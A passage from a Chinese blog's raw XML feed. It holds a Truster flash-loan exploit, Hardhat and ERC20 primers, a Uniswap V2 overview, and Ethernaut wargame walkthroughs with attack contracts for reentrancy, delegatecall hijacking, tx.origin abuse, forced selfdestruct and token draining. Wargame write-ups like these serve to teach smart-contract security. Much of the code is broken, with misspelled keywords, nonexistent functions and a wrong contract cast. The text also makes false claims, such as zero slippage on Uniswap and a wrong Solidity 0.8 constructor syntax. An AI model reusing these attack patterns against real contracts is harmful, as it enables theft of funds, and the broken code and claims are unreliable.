title="Truster"></a>Truster</h2><p>要求是，获取这个池中的全部DIV</p><p>分析：看整个合约，还是挺简单的，也易读易懂，flashLoan合约中，实现了简单的合约代码，执行回调的函数就是 target.functionCall(data);主要从这个入手，攻击合约如下：</p><pre><code>pragam solidityb ^0.8.0;import&quot;./TusterLenderPool.sol&quot;;import&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;interface ITusterLenderPool&#123;    function flashLoan(uint256 borrowAmount,address borrower,address target,bytes calldata data);&#125;contract TusterExploit&#123;   ITusterlenerPool cons;   address pool;   uint256 balanceof;   address tokenaddress;   constractor (address _pool,address _tokenaddress,uint256 Balanceof)   &#123;    cons = ITusterLenderPool(_pool);    pool = _pool;    tokenaddress = _tokenaddress;    balanceof = Balanceof;   &#125;   function hack() public &#123;    cons.flashLoan(0,msg.sender,tokenaddress,abi.codeWithSigner(&quot;appove(address,uint256)&quot;,address(this),balanceof));    IERC20 token  = IERC20(tokenaddress);    token.transferFrom(pool,msg.sender,balanceof);   &#125;&#125;pragma solidity ^0.8.0;</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hardhat</title>
      <link href="/2024/08/06/hardhat/"/>
      <url>/2024/08/06/hardhat/</url>
      
        <content type="html"><![CDATA[<h1 id="hardhat"><a href="#hardhat" class="headerlink" title="hardhat"></a>hardhat</h1><p><strong>hardhat</strong>就是以太坊开发环境，如同remix,现在介绍一下安装<strong>hardhat</strong>的步骤</p><ul><li>打开终端，win+r,输入cmd</li><li>检查node js,安装没有，<code>node -v</code> (没有安装去官网下载)</li><li>建一个文件夹，在终端输入<code>mkdir hardhat-tutorial</code>，然后进入文件夹，<code>cd hardhat-tutorial</code></li><li>进行初始化，<code>npm init</code>，接下来一直按enter,直到出现<code>Is this OK? (yes)</code>,回答yes即可</li><li>安装<strong>hardhat</strong> <code>npm install --save-dev hardhat</code>,需要等待几秒</li><li>再安装一个插件 npm install –save-dev @nomicfoundation&#x2F;hardh<br>at-toolbox<br>s</li></ul><h2 id="编写合同"><a href="#编写合同" class="headerlink" title="编写合同"></a>编写合同</h2><p>安装完成后，因为使用VScode,所以我们要安装一个VScode 安全帽，它可以帮组我们更好的使用solidity语言，然后在VScode创建一个新目录，写一个简单的.sol合约，在终端中运行该合约，<code>npx hardhat compile,</code>成功后就会看到<code>Compiled 1 Solidity file successfully (evm target: paris).</code></p><h2 id="测试合约"><a href="#测试合约" class="headerlink" title="测试合约"></a>测试合约</h2><p><code>npx hardhat test</code>,如果你想看到solidity的日志消息，合约变量，必须导入<code>hardhat/console.sol</code>合约代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;hardhat/console.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line">  //...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再添加一些对该函数console.log的调用transfer()</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transfer(address to, uint256 amount) external &#123;</span><br><span class="line">    require(balances[msg.sender] &gt;= amount, &quot;Not enough tokens&quot;);</span><br><span class="line"></span><br><span class="line">    console.log(</span><br><span class="line">        &quot;Transferring from %s to %s %s tokens&quot;,</span><br><span class="line">        msg.sender,</span><br><span class="line">        to,</span><br><span class="line">        amount</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    balances[msg.sender] -= amount;</span><br><span class="line">    balances[to] += amount;</span><br><span class="line"></span><br><span class="line">    emit Transfer(msg.sender, to, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结，hardhat就是能轻松部署我们的合约、运行测试和调试 Solidity 代码，无需处理实时环境，更多知识请参考<a href="https://hardhat.org/">hardhat</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Uniswap V2</title>
      <link href="/2024/08/06/uniswap-V2/"/>
      <url>/2024/08/06/uniswap-V2/</url>
      
        <content type="html"><![CDATA[<h1 id="Uniswap-V2"><a href="#Uniswap-V2" class="headerlink" title="Uniswap V2"></a>Uniswap V2</h1><p><strong>Uniswap</strong>是一种流行的去中心化交易所 (DEX)协议，允许用户将任何 ERC20 代币交换为另一种代币，提供流动性以赚取费用，并访问以太坊区块链上的价格预言机。 而Uniswap V2具有更强大的功能，如下：</p><ul><li>它允许任何的ERC20代币与其他的ERC20代币配对，无需ETH作为中介，这使得流动性池更加多样化和高效，并为交易者提供更好的价格。 就是一种代币可与其他的代币转化，方便很多</li><li>Uniswap V2 实施了一种新颖的机制，可实现高度去中心化且抗操纵的链上价格供给。 这是通过在每个区块开始时测量两种资产的相对价格并随着时间的推移积累历史数据来实现的。 这允许外部智能合约查询任何时间间隔内任何货币对的时间加权平均价格（TWAP），同时将天然气成本和预言机风险降至最低。</li><li>Uniswap V2 支持一种称为闪电互换的新型交易，用户可以从池中接收任意数量的任何资产，并在链上的其他地方使用它，只要他们在交易结束时偿还该金额并支付费用即可。 交易。 这为套利、保证金交易、抵押品互换等开辟了新的可能性。</li></ul><p>同时它也有很多好处：</p><ul><li>低费用：Uniswap V2 对每笔交易收取 0.3% 的固定费用，该费用由所有流动性提供者按其在池中的权益比例分配。 该费用低于大多数中心化交易所和其他 DEX 协议，这使得 Uniswap V2 成为中小额交易的有吸引力的选择。</li><li>高流动性：Uniswap V2 利用以太坊及其庞大的 ERC20 代币生态系统的网络效应，为任何代币对提供高流动性。 任何人都可以通过提供一定数量的两种代币来创建新的货币对或加入现有的货币对，从而增加池的深度和可用性。 此外，Uniswap V2 采用自动做市商（AMM）模型，根据供需情况调整价格，确保任何交易规模始终有足够的流动性。</li><li>无许可访问：Uniswap V2 是<strong>完全去中心化和非托管的</strong>，这意味着任何人都可以使用它，而无需注册帐户、验证身份或信任第三方使用其资金。 用户可以完全控制自己的资产，可以随时进行交易或提供流动性，而无需担心停机、审查或黑客攻击。</li><li>透明定价：Uniswap V2 采用简单透明的定价机制，由恒定乘积公式和矿池当前准备金余额决定。 用户可以轻松计算他们将收到或支付任何交易的确切代币数量，没有任何隐藏费用或滑点。 用户还可以根据池的历史数据访问任何货币对的可靠且无需信任的价格预言机。</li></ul><p>要使用Uniswap V2可在<a href="https://uniswap.org/">官网</a>上访问,可以自己创建一个Uniswap钱包，一定要记住<strong>私钥</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ERC20</title>
      <link href="/2024/08/05/ERC20/"/>
      <url>/2024/08/05/ERC20/</url>
      
        <content type="html"><![CDATA[<h1 id="ERC20"><a href="#ERC20" class="headerlink" title="ERC20"></a>ERC20</h1><p><code>ERC20</code>是以太坊上的代币标准，它实现了代币转账的基本逻辑：</p><ul><li>账户余额(balanceOf())</li><li>转账(transfer())</li><li>授权转账(transferFrom())</li><li>授权(approve())</li><li>代币总供给(totalSupply())</li><li>授权转账额度(allowance())</li><li>代币信息（可选）：名称(name())，代号(symbol())，小数位数(decimals())</li></ul><p>除了ERC20,还有它的接口合约IERC20，就是为了统一规范，以便好使用，接下来就介绍一下IERC20合约的功能</p><h2 id="俩个事件"><a href="#俩个事件" class="headerlink" title="俩个事件"></a>俩个事件</h2><ul><li>释放条件：当 <code>value</code> 单位的货币从账户 (<code>from</code>) 转账到另一账户 (<code>to</code>)时.<br><code>event Transfer(address indexed from, address indexed to, uint256 value);</code></li><li>释放条件：当 <code>value</code> 单位的货币从账户 (<code>owner</code>) 授权给另一账户 (<code>spender</code>）时.<br><code>event Approval(address indexed owner, address indexed spender, uint256 value);</code></li></ul><h2 id="六个函数"><a href="#六个函数" class="headerlink" title="六个函数"></a>六个函数</h2><ul><li><code>totalSupply()</code>返回代币总供给<br><code>function totalSupply() external view returns (uint256);</code></li><li><code>balanceOf()</code>返回账户<code>account</code>所持有的代币数.<br><code>function balanceOf(address account) external view returns (uint256);</code></li><li><code>transfer()</code>转账 <code>amount</code> 单位代币，从调用者账户到另一账户 <code>to</code>,如果成功，返回 <code>true</code>,释放 {Transfer} 事件.<br><code>function transfer(address to, uint256 amount) external returns (bool);</code></li><li><code>allowance()</code>返回<code>owner</code>账户授权给<code>spender</code>账户的额度，默认为0,当{approve} 或 {transferFrom} 被调用时，<code>allowance</code>会改变<br><code>function allowance(address owner, address spender) external view returns (uint256);</code></li><li><code>approve()</code>调用者账户给<code>spender</code>账户授权 <code>amount</code>数量代币,如果成功，返回 <code>true</code>,释放 {Approval} 事件<br><code>function approve(address spender, uint256 amount) external returns (bool);</code></li><li><code>transferFrom()</code>通过授权机制，从<code>from</code>账户向<code>to</code>账户转账<code>amount</code>数量代币。转账的部分会从调用者的<code>allowance</code>中扣除。 如果成功，返回 <code>true</code>. 释放 {Transfer} 事件. <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> function transferFrom(</span><br><span class="line">    address from,</span><br><span class="line">    address to,</span><br><span class="line">    uint256 amount</span><br><span class="line">) external returns (bool);</span><br></pre></td></tr></table></figure>以上须记住，以便好用</li></ul><p>说白了，它就是以太坊发行代币的一个标准，学会了如何实现ERC20，对入门区块链是很有帮助的</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Ethernaut靶场题解</title>
      <link href="/2024/08/01/Ethernaut%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/"/>
      <url>/2024/08/01/Ethernaut%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut"><a href="#Ethernaut" class="headerlink" title="Ethernaut"></a><a href="https://ethernaut.openzeppelin.com/">Ethernaut</a></h1><h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><p>要求是，成为这个合约的所有者，并使这个合约的钱为零</p><p>分析;<br>从这个合约中可以看到，要成为owner<br>1，我们的钱必须大于合约持有者的钱，但是最开始合约本身就有1000ether，这个时候就走contribute函数不行，因为我们没有那么多钱<br>2，此时发现receive，只要我们的钱和合约的钱大于0，就可以成为这个合约的持有者</p><p>方法：<br>1，在remix上不能部署这个合约，因为部署后，合约初始化，owner就是我们自己了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">constructor() &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">      contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>直接使用合约地址<strong>At Adress</strong><br>2,调用contribute函数，转账1wei；<br>2,调用receive函数，转账1wei,就完成了,注意记得将钱收回来</p><hr><h2 id="Fal1out"><a href="#Fal1out" class="headerlink" title="Fal1out"></a>Fal1out</h2><p>要求是，成为这个合约的所有者</p><p>分析：<br>注意这个的solidity的版本是0.6，没有影响关系，只是构造函数的写法不一样，如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//solidity 0.8</span><br><span class="line">  constructor foo()&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">//solidity 0.6</span><br><span class="line">  function foo()&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>看与owner相关的函数，再去分析构造的合约名字Fallout，仔细发现有个Fal1out的函数，它实际上是命名错误的，这个时候我们就可以调动这个函数，刚好成为合约的所有者</p><p>方法：直接部署不行，因为里面有其他的import，所以我们就外部调用这个合约，使用接口,另创建一个合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Fallout &#123;</span><br><span class="line">    function owner() external view returns(address) //观察所有者的地址是否为我们</span><br><span class="line">    function Fal1out() external payable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h2><p>要求是，连续猜对10次猜对硬币的结果</p><p>分析：就是要想办法调用flip()函数10次，让猜测的结果与side一致</p><p>方法：直接上攻击合约,在目标合约内,部署攻击合约，就是一样的调用目标合约的flip函数之后，得到的guess在进入一样的目标合约之中，这样我们的猜测值guess就与side一样了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contact Hack &#123;</span><br><span class="line">  CoinFlip private immutable target;</span><br><span class="line">  FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor (address _target)&#123;</span><br><span class="line">    target = CoinFlip(_target);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function flip external &#123;</span><br><span class="line">    bool guess = _guess();</span><br><span class="line">    require(target.flip(guess),&quot;guess failed&quot;);//保证攻击合约中的guess与初始合约的side一样</span><br><span class="line">    &#125;</span><br><span class="line">  // 复制初始合约的flip()函数</span><br><span class="line">  function _guess() view returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">    uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line">     return side;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h2><p>要求是，获得该合约的所有权</p><p>分析：代码还是挺短的，主要就是弄懂<strong>tx.origin</strong>是什么意思，<strong>tx.origin</strong>是发起交易的账户，<strong>msg.sender</strong>是当前直接调用这个合约的即时账户，只要这俩者不一样就成功了<br>详细解释：</p><ul><li>A调用B合约<ul><li>tx.origin&#x3D;A</li><li>msg.sender&#x3D;A</li></ul></li><li>A调用B合约，B合约调用C合约<ul><li>tx.origin&#x3D;A</li><li>msg.sender&#x3D;B</li></ul></li></ul><p>方法：直接调用Telephone合约，不能满足条件，所以我们要写一个攻击合约来调用Telephone合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  constructor (address _target)&#123;</span><br><span class="line">    Telephone(_target).changeOwner(msg.sender);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_target接受Telephone的地址，我们部署Hack合约，msg.sender就是我们的地址</p><hr><h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><p>要求是，我们有20个代币，需要让代币余额增加到20以上</p><p>分析：还是看solidity版本，0.6版本没有内置Safemath,所以就可以执行溢出或者下溢的操作  </p><blockquote><p>Safemath:在Solidity 中，SafeMath是一个常用的库，用于防止整数溢出和下溢的安全数学运算工具。由于Solidity的整数类型（如 uint 和int ）是有限的，当进行加法、减法、乘法或除法运算时，如果操作结果超出了类型范围，就会导致溢出或下溢<br>如，0-1会导致下溢，就会生成最大的无符号整数，并且大于0</p></blockquote><p>方法：调用攻击合约中，再调用transfer函数，给msg.sender转账1个代币，由于攻击合约没有代币，就会发生下溢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Token &#123;</span><br><span class="line">function balanceOf(address _) public view returns (uint256)</span><br><span class="line">function transfer(address _to, uint256 _value) public returns (bool)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">  constructor(address _target)&#123;</span><br><span class="line">   Telephone(_target).transfer(msg.sender,1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h2><p>要求是，获得这个合约的所有权</p><p>分析：理解<a href="https://wtf.academy/docs/solidity-102/Delegatecall/">delegatecall</a>,就是调用pwm函数，通过触发fallback函数，然后进行委托用</p><p>方法：部署Delegate合约，但是不调用，我们是在delegation合约上调用pwn函数</p><hr><h2 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h2><p>要求是，使这个合约的余额大于零</p><p>分析：代码还是很简单，就是一个空合约，什么函数也没有，就考虑到自毁合约的功能  </p><blockquote><p>自毁合约：自毁合约是一种智能合约，通常基于区块链技术，其设计初衷是在特定条件下自动执行某些预定的操作，最终将合约自身的功能或者存储的资产销毁。这种合约的设计可以确保在特定情况发生时，例如某个时间点到达、某个条件达成或者特定的事件发生，合约内部的资产或者代码可以被永久删除或者无法访问。</p></blockquote><p>方法：使用通过selfdestructh功能删除一个合约，合约内所有的余额将被强制发送到另一个合约，就是写一个攻击合约自毁</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  constructor (address payable _target) payable&#123;</span><br><span class="line">      selfdestruct(_target);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署攻击合约时记得发送1wei</p><hr><h2 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h2><p>要求是，解锁保险箱</p><p>分析：password是个私有变量，不能直接获取，但是它也是个状态变量，可以访问的，通过回到ethernaut网站，在控制台获得密码即可</p><p>方法：在控制台输入 <code>await web3.eth.getStorageAt(contract.address,1)</code>, 获得密码</p><hr><h2 id="king"><a href="#king" class="headerlink" title="king"></a>king</h2><p>要求是，破坏游戏规则</p><p>分析：通过合约来看就是阻碍别人调用receive函数,拒接别人的转账,</p><p>方法：写一个攻击合约,不要有fallback,receive函数，防止新玩家转账，成为新国王</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  constructor (address payable target) payable&#123;</span><br><span class="line">      uint prize = King(target).prize();</span><br><span class="line">      (bool ok,)=target.call&#123;value: prize&#125;(&quot;&quot;);</span><br><span class="line">      require(ok,&quot;call failed&quot;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在执行攻击合约时，首先检查当前的奖金值，然后部署攻击合约时，发送该奖金值</p><hr><h2 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h2><p>要求是：窃取合约中的所有资金</p><p>分析：这是一个典型的重入攻击  </p><blockquote><p>重入攻击：重入攻击的典型示例是以太坊的智能合约中发生的情况。以太坊的智能合约是按照以太币（ETH）的传统交易方式执行的，合约可以调用其他合约或发送ETH到外部账户。如果一个合约在调用外部合约时先转移ETH给另一个合约，并且在接收ETH后再执行其他逻辑，那么这个外部合约可以在接收ETH后调用原合约，重新执行发送ETH的逻辑，导致重复的ETH转移，从而造成资金损失。<br>通过不断调用withdraw函数,窃取资金</p></blockquote><p>方法: 写一个攻击合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier:   MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface IReentrance &#123;</span><br><span class="line">  function donate(address) public payable;</span><br><span class="line">  function withdraw(uint256) public;</span><br><span class="line">&#125;</span><br><span class="line">contract Hack &#123;</span><br><span class="line">  IReetrance private immutable target;</span><br><span class="line"></span><br><span class="line">  constructor(address _target)&#123;</span><br><span class="line">    target = IReetrance(_target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function attack() external payable &#123;</span><br><span class="line">    target.donate&#123;value: 1e18&#125;(address(this));</span><br><span class="line">    target.withdraw(1e18);</span><br><span class="line">    require(address(target).balance == 0,&quot;target balance &gt;0&quot;);</span><br><span class="line">    selfdesctruct(paybale(msg.sender));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external paybale &#123;</span><br><span class="line">    uint prize = min(1e18,address(target).balance);</span><br><span class="line">    if(prize &gt; 0)&#123;</span><br><span class="line">    target.withdraw(prize);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function min(uint x,uint y) private pure returns(uint) &#123;</span><br><span class="line">     return x&lt;=y ? x:y;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署攻击合约,调用attack函数发送1ether,即可</p><hr><h2 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h2><p>要求是,到达建筑物的顶楼</p><p>分析:第一次的building.isLastFloor(_floor)要为false,满足if的条件,第二次的building.isLastFloor(_floor)要为ture,使电梯到楼顶</p><p>方法: 就是在攻击合约中写isLastFloor函数,达到要求,</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  Elevator private immutable target;</span><br><span class="line">  uint private count;</span><br><span class="line"></span><br><span class="line">  constructor (address _target)&#123;</span><br><span class="line">    target = Elevateor(_target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() external &#123;</span><br><span class="line">    target.goTo(1);</span><br><span class="line">    require(target.top(),&quot;NOT TOP&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function isLastFloor(uint) external returns(bool)&#123;</span><br><span class="line">    count++;</span><br><span class="line">    return count &gt; 1;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h2><p>要求是,解锁该合约</p><p>分析:就是将locked初始值ture,改为false,调用unlock函数</p><p>方法: 首先要知道每个私有状态可变的储存slot,如图:<br>![这是图片](C:\Users\ASUS\blog\source\09afcfa44c4d7ce14ff699e10fd1a22c.jpg slot)<br>再使用Web库来获取这个数据,然后截取为16字节,即为密钥,再调用unlock函数,将其作为参数传递即可</p><hr><h2 id="Naugth-Coin"><a href="#Naugth-Coin" class="headerlink" title="Naugth Coin"></a>Naugth Coin</h2><p>要求是,将代币余额变为零</p><p>分析:难点有个时间锁,在转移代币时,必须等待10年,所以就思考其他的方法,然后就是熟悉ERC20合约,目标合约importl了ERC20,后面的攻击合约也要使用,建议先熟悉ERC20合约再来解题,我这就直接上攻击合约</p><p>方法:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solodity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface INaughtCoin &#123;</span><br><span class="line"> function player() external view returns(address);</span><br><span class="line"></span><br><span class="line">interface IERC20 &#123;</span><br><span class="line"> function balanceof(address account) external view returns (uint256);function approve(address spender, uint256 amount) external returns(bool);</span><br><span class="line"> function transferFrom(address sender,address recipient, uint256 amount)extlernal;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">  //deploy</span><br><span class="line">  //coin.approve(hack,amount)</span><br><span class="line">  //pwn</span><br><span class="line">  function pwn(IERC20 coin) external &#123;</span><br><span class="line">    address player = INaughtCoin(address(coin)).player;</span><br><span class="line">    uint bal = coin.balanceOf(player);</span><br><span class="line">    coin.transferFrom(player,address(this),bal);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h2><p>要求是,获得该合约的所有权</p><p>分析:委托调用,注意看函数签名,<code>bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;))</code>,当我们调用setFirstTime函数时,委托调用会执行setTime函数,此时timeZone1Library的地址将会更新,如果我们再次调用setFirstTime函数,又更新地址,这样就能成为owner</p><p>方法:还是写一个攻击合约,进行调用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner;</span><br><span class="line">  uint256 storedTime;</span><br><span class="line"></span><br><span class="line">  function attack(Preservation target) external &#123;</span><br><span class="line">    target.setFistTime(uint256(uint160(address this)));</span><br><span class="line">    target.setFistTime(uint256(uint160(msg.sender)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function setTime(uint _owner) external &#123;</span><br><span class="line">    owner = address(uint160(_owner));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h2><p>要求是,恢复丢失的0.001以太币</p><p>分析:这是一个工厂合约,由于不知道代币的地址,无法找到丢失的以太币,所以我们的任务是找到这个代币合约的地址,然后进行自毁合约,有俩种方法找到代币合约的地址,一是通过区块链浏览器Etherscan,查询调用generate Token交易,找到代币合约地址,二是通过计算,在Ethereum Stack Exchange上可以查询计算方式</p><p>方法:采用计算地址的方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Dev&#123;</span><br><span class="line">  function recover(address sender) external pure returns (address) &#123;</span><br><span class="line">    address addr = address (uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6),bytes1(0x94),sender,bytes1(0x01))))));</span><br><span class="line">    return addr;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="MagicNunmber"><a href="#MagicNunmber" class="headerlink" title="MagicNunmber"></a>MagicNunmber</h2><p>要求是,调用whatIsTheMeaningOfLife()函数,并且返回数字42,但是攻击合约不能超过10个合约</p><p>分析:如果直接调用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack&#123;</span><br><span class="line">   function whatIsTheMeaningOfLife() external pure returns (uint)&#123;</span><br><span class="line">    return 42;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个合约将超过10个合约码,不符合要求,这时就使用汇编编写一个智能合约,然后手动部署代码(本人还在学习汇编语言)</p><hr><h2 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h2><p>要求是,在所有者在调用withdraw函数时拒绝其提取资金</p><p>分析:这题大概思路很好懂,就是如何去实现拒绝转账这步要思考一下,又是要用到汇编语言,等我学习后再来补题解</p><hr><h2 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h2><p>要求是，以低于要价的价格从商店购买物品</p><p>分析：就是使状态变量isSold等于true，而且还要使价格低于100，目标合约已经给了一个接口，就是就是在调用这个接口的时候满足要求，第一次调用的时候，要使价格高于100，满足if的条件，第二次调用的时候price就设置低于100的价格即可</p><p>方法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack&#123;</span><br><span class="line">  Shop private immutable target;</span><br><span class="line"></span><br><span class="line">   constructor (address _target)&#123;</span><br><span class="line">    target = Shop(_target);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   function pwn() external &#123;</span><br><span class="line">    target.buy();</span><br><span class="line">   &#125;</span><br><span class="line">   function price() external view returns (uint256)&#123;</span><br><span class="line">    //利用第一次返回isSold为ture来区分第几次调用</span><br><span class="line">    if(isSold)</span><br><span class="line">      return 99;</span><br><span class="line">    else</span><br><span class="line">      return 100;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>靶场题解</title>
      <link href="/2024/08/01/%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/"/>
      <url>/2024/08/01/%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><p>要求是，成为这个合约的所有者，并使这个合约的钱为零</p><p>首先找到owner，</p><p>分析;<br>从这个合约中可以看到，要成为owner<br>1，我们的钱必须大于合约持有者的钱，但是最开始合约本身就有1000ether，<br>这个时候就走contribute函数不行，因为我们没有那么多钱<br>2，此时发现receive，只要我们的钱和合约的钱大于0，就可以成为这个合约的持有者</p><p>方法：<br>1，在remix上部署这个合约，首先调用contribute函数，给我们转账；<br>2，在调用receive函数，就完成了</p><h2 id="Fal1out"><a href="#Fal1out" class="headerlink" title="Fal1out"></a>Fal1out</h2><p>要求是，成为这个合约的所有者</p><p>从这个题目来看，Fallout,Fal1out,</p><p>分析：<br>首先看与owner相关的函数，再去分析构造的合约名字Fallout，仔细发现有个Fal1out的函数，它实际上是命名错误的，这个时候我们就可以调动这个函数，刚好成为合约的所有者</p><p>方法：</p><p>定义函数接口，直接调用该函数Fal1out,此时就成为了合约的所有者</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>my fist blog</title>
      <link href="/2024/08/01/my-fist-blog/"/>
      <url>/2024/08/01/my-fist-blog/</url>
      
        <content type="html"><![CDATA[<h2 id="先进入blog-cd-blog"><a href="#先进入blog-cd-blog" class="headerlink" title="先进入blog         cd blog"></a>先进入blog         cd blog</h2><h2 id="预览hexo-hexo-s"><a href="#预览hexo-hexo-s" class="headerlink" title="预览hexo             hexo s"></a>预览hexo             hexo s</h2><h2 id="创建文章题目-hexo-new-“”"><a href="#创建文章题目-hexo-new-“”" class="headerlink" title="创建文章题目        hexo new “”"></a>创建文章题目        hexo new “”</h2><h2 id="进入文章目录-cd-提目前，blog后的东西）题目-md"><a href="#进入文章目录-cd-提目前，blog后的东西）题目-md" class="headerlink" title="进入文章目录        cd   提目前，blog后的东西）题目.md"></a>进入文章目录        cd   提目前，blog后的东西）题目.md</h2><h2 id="写文章-notepad-题目-md"><a href="#写文章-notepad-题目-md" class="headerlink" title="写文章                  notepad 题目.md"></a>写文章                  notepad 题目.md</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/08/01/hello-world/"/>
      <url>/2024/08/01/hello-world/</url>
      
